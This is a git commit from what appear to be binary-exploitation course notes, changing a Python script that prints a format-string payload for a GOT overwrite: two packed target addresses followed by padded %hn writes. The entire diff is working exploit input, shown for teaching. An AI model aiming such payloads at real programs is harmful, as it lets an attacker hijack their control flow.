a2993f5cd1ce6c1908d7cd98dc4c0b4f5ab18675
Devin <devneal@nealscape.mit.edu>
2017-01-05 16:45:53 -0500

    finished notes for day 4

--- notes/day4/got_overwrite/input.py
+++ notes/day4/got_overwrite/input.py
@@ -6,4 +6,4 @@ target_address          = struct.pack("<I", 0x0804a01c)
 target_address_plus_two = struct.pack("<I", 0x0804a01c+2)
 
 # two writes
-print target_address + target_address_plus_two + "%34019x%2$n%33561x%3$n"
+print target_address + target_address_plus_two + "%34019x%2$hn%33561x%3$hn"
